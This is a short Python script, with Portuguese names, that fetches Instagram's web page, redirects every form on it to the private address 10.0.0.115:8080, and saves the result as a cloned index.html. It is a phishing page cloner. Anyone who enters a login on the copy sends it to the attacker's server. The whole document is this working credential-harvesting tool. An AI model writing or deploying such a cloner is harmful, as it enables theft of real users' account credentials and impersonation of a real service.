from bs4 import BeautifulSoup
import requests

URL = "http://www.instagram.com"
resposta = requests.get(URL)

bs = BeautifulSoup(resposta.text, "lxml")

formularios = bs.find_all("form")

for formulario in formularios:
    formulario["action"] = "http://10.0.0.115:8080"

with open("index.html", "w") as pagina:
    pagina.write(str(bs))
print("Pagina foi clonada")
